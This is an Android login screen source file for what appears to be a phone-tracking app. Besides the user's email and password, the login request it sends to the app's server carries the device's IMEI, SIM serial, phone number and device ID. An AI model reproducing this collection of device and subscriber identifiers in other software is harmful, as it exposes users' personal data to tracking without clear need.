package com.enuke.smartapp;

import org.json.JSONException;
import org.json.JSONObject;

import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.text.SpannableString;
import android.text.TextUtils;
import android.text.style.UnderlineSpan;
import android.view.MotionEvent;
import android.view.View;
import android.view.View.OnClickListener;
import android.view.inputmethod.InputMethodManager;
import android.widget.Button;
import android.widget.CheckBox;
import android.widget.EditText;
import android.widget.RelativeLayout;
import android.widget.TextView;
import android.widget.Toast;

import com.asynctask.httpconnect.ConnectToServerWithSpiner;
import com.blinkawards.utility.DeviceDetails;
import com.blinkawards.utility.Utility;

public class LoginActivity extends Activity
{
    
	private RelativeLayout relativeLayout;
	private EditText mEmailId;
	private EditText mPassword;
	private CheckBox mTerms;
	private TextView mShowTerms;
	private Button mLoginButton;
	private Button mSignUpButton;
	private TextView mheadetext;
	private Context mContext = LoginActivity.this;
	private String mEailString;
	private String mPassString;
	


	@Override
	protected void onCreate(Bundle savedInstanceState)
	{
	
		super.onCreate(savedInstanceState);
		if(Utility.getSaveDataLocally(LoginActivity.this, "TermsCheck").equalsIgnoreCase("true")){
			
		/*	if (Utility.getSaveDataLocally(mContext, "mClientId").length() != 0)
			{
				////System.out.println("the client id is:"+ Utility.getSaveDataLocally(mContext, "mClientId"));
			
			}*/
			
			startActivity(new Intent(mContext, Home.class));
			finish();
		}
			setContentView(R.layout.login_activity);
			
			
			registerControls();
			
			
			mLoginButton.setOnClickListener(new OnClickListener()
			{

				@Override
				public void onClick(View v) 
				{

					if (!TextUtils.isEmpty(mEmailId.getText().toString().trim()))
					{
						mEmailId.setError(null);
						if(Utility.isEmailValid(mEmailId.getText().toString().trim()))
						{
							if (!TextUtils.isEmpty(mPassword.getText().toString().trim()) && mPassword.getText().toString().trim().length()>5)
							{
								
								mPassword.setError(null);
								if(mTerms.isChecked()){
								Utility.saveDataLocally(LoginActivity.this, "TermsCheck", "true");
								sendUserDataToServer();
								}else{
								 Toast.makeText(mContext, "Please accept Terms & Condition to login.", Toast.LENGTH_LONG).show();	
								}
							}else
							{
								mPassword.setFocusableInTouchMode(true);
								mPassword.requestFocus();
								mPassword.setError("Password does not match, please try again.");
							}
					    }else
					    {

					    	mEmailId.setFocusableInTouchMode(true);
							mEmailId.requestFocus();
					    	mEmailId.setError("Please Enter Valid Email Address");
					    }
						
					}
					else
					{
						mEmailId.setFocusableInTouchMode(true);
						mEmailId.requestFocus();
						mEmailId.setError("Please Enter Email Address");
					}

				}
			});
			
			
			mShowTerms.setOnClickListener(new OnClickListener() {
				
				@Override
				public void onClick(View v) {								
				final CustomAlertDialog dilaAlertDialog=new CustomAlertDialog();
				dilaAlertDialog.showDailog(mContext, false, true,false, (int)getResources().getDimension(R.dimen.ConditionDialogHeight),true);
				dilaAlertDialog.setAlertTitle("!!!Terms and Conditions!!!");
				dilaAlertDialog.setWebViewURL("http://www.spynguard.com/help");
				dilaAlertDialog.getButtonMiddle().setText("OK");
				dilaAlertDialog.getButtonMiddle().setOnClickListener(new OnClickListener() {
					
					@Override
					public void onClick(View v) {
					dilaAlertDialog.dismissDialog();
						
					}
				});
					
				}
			});
			
			
			mSignUpButton.setOnClickListener(new OnClickListener() {
				
				@Override
				public void onClick(View v) {
					startActivity(new Intent(mContext,SignUpActivity.class));
					finish();
				}
			});

	}

	private void registerControls() 
	{
		relativeLayout= (RelativeLayout) findViewById(R.id.loginParent);
		mheadetext = (TextView) findViewById(R.id.mHeaderText);
		mheadetext.setText("Login");
		mEmailId = (EditText) findViewById(R.id.mEmailId);
		mPassword = (EditText) findViewById(R.id.mPassword);
		mLoginButton = (Button) findViewById(R.id.mLoginButton);
		mSignUpButton = (Button) findViewById(R.id.mSignUpButton);
	    mTerms=(CheckBox)findViewById(R.id.mTerms);
	    mShowTerms=(TextView) findViewById(R.id.mShowTerms);
	    String tempString = new String(getResources().getString(R.string.accept_terms_and_conditions));
	    SpannableString content = new SpannableString(tempString);
	    content.setSpan(new UnderlineSpan(), 0, tempString.length(), 0);
	    mShowTerms.setText(content);
	    mShowTerms.setTextColor(getResources().getColor(R.color.text_color));

	}

	

	protected void sendUserDataToServer() 
	{	//this will help to hide the application 
		InputMethodManager imm = (InputMethodManager)getSystemService(
			      Context.INPUT_METHOD_SERVICE);
			imm.hideSoftInputFromWindow(mEmailId.getWindowToken(), 0);
			//end
		String mPhoneManufacture = DeviceDetails.getManufacturer();
		String mPhoneModle = DeviceDetails.getModel();
		String mOS = DeviceDetails.getOS();
		String imei = DeviceDetails.getIMEINumber(mContext);
		String mSimNumber = DeviceDetails.getSimSerialNumber(mContext);
		String Networkoperator = DeviceDetails.getNetworkOperatorName(mContext);
		String DeviceId = DeviceDetails.getDeviceId(mContext);
		String mMobileNumber = DeviceDetails.getLine1Number(mContext);
		////System.out.println("IMEI:" + imei + "Sim Number" + mSimNumber+ " network Opterator " + Networkoperator + " mMobileNumber "+ mMobileNumber);
		if (Utility.isInternetConnected(mContext))
		{
		try 
		{
				String url = Utility.getBaseposturl();
				JSONObject devicedetails = new JSONObject();
				devicedetails.put("DeviceManufacture", mPhoneManufacture);
				devicedetails.put("DeviceModel", mPhoneModle);
				devicedetails.put("AndroidOS", mOS);
				devicedetails.put("SIMNumber", mSimNumber);
				devicedetails.put("MobileNumber", mMobileNumber);
				devicedetails.put("DeviceId", DeviceId);
				devicedetails.put("IMEI", imei);
				devicedetails.put("NetworkOperator", Networkoperator);
				JSONObject loginrequest = new JSONObject();
				mEailString=mEmailId.getText().toString().trim();
				mPassString=mPassword.getText().toString().trim();
				loginrequest.put("Email", mEailString);
				loginrequest.put("Password", mPassString);
				loginrequest.put("GooglePlay", Utility.updatenotification);
				loginrequest.put("DeviceDetails", devicedetails);			
			
				
				JSONObject finaldata = new JSONObject();
				finaldata.put("LoginRequest", loginrequest);
			
				ConnectToServerWithSpiner connect = new ConnectToServerWithSpiner();
				connect.extConnectToServer(LoginActivity.this,new ConnectToServerWithSpiner.Callback() 
				{
							public void callFinished(String result)
							{
								httpResult(result);
							}
						}, url, finaldata, "POST");
				connect.execute(finaldata);

			} catch (Exception e) {

				////System.out.println("Print execute error " + e);
			}

		} else {
			Utility.showToast(mContext, "Please check your internet connection");
		}

	}

	protected void httpResult(String result)
	{

		JSONObject resp = null;
		try
		{
			resp = new JSONObject(result);
			JSONObject response = resp.getJSONObject("LoginResponse");
			if (response.getString("Status").equalsIgnoreCase("OK")) 
			{
				Utility.saveDataLocally(mContext, "mClientId",response.getString("ClientId"));
				Utility.saveDataLocally(mContext, "mAppType",response.getString("AppType"));
				Utility.saveDataLocally(LoginActivity.this, "isTrack","true");
				////System.out.println("cliend id is:"+mCid);
				final CustomAlertDialog dilaAlertDialog=new CustomAlertDialog();
				dilaAlertDialog.showDailog(mContext, false, true,false, (int)getResources().getDimension(R.dimen.ConditionDialogHeight));
				dilaAlertDialog.setAlertTitle("Alert");
				dilaAlertDialog.setAlertMessage(response.getString("Message"));
				dilaAlertDialog.getButtonMiddle().setText("OK");
				dilaAlertDialog.getButtonMiddle().setOnClickListener(new OnClickListener() {
					
					@Override
					public void onClick(View v) {
						startActivity(new Intent(mContext, Home.class));
						LoginActivity.this.finish();
					    dilaAlertDialog.dismissDialog();
						
					}
				});
				//showPopup(mContext, response.getString("Message"), false);
			}else if(response.getString("Status").equalsIgnoreCase("error")){
				
				final CustomAlertDialog dilaAlertDialog=new CustomAlertDialog();
				dilaAlertDialog.showDailog(mContext, false, true,false,(int)getResources().getDimension(R.dimen.ConditionDialogHeight));
				dilaAlertDialog.setAlertTitle("Alert");
				dilaAlertDialog.setAlertMessage(response.getString("Message"));
				dilaAlertDialog.getButtonMiddle().setText("OK");
				dilaAlertDialog.getButtonMiddle().setOnClickListener(new OnClickListener() {
					
					@Override
					public void onClick(View v) {
					dilaAlertDialog.dismissDialog();
					Utility.saveDataLocally(LoginActivity.this, "TermsCheck", "false");
						
					}
				});
				
			}
		} catch (final JSONException e) 
		{
			////System.out.println("MainActivity json error" + e);
		}
	}

	
	
	
	 /**
	 * Called to process touch screen events. 
	 */
	@Override
	public boolean dispatchTouchEvent(MotionEvent ev) {

	    switch (ev.getAction()){
	        case MotionEvent.ACTION_DOWN:
	        	if(relativeLayout!=null)
	        	Utility.hideSoftKeyboard(LoginActivity.this, relativeLayout);
	            break;

	        case MotionEvent.ACTION_UP:
	            //to avoid drag events
	        	if(relativeLayout!=null)
	        	Utility.hideSoftKeyboard(LoginActivity.this, relativeLayout);
	            break;
	    }

	    return super.dispatchTouchEvent(ev);
	}
}
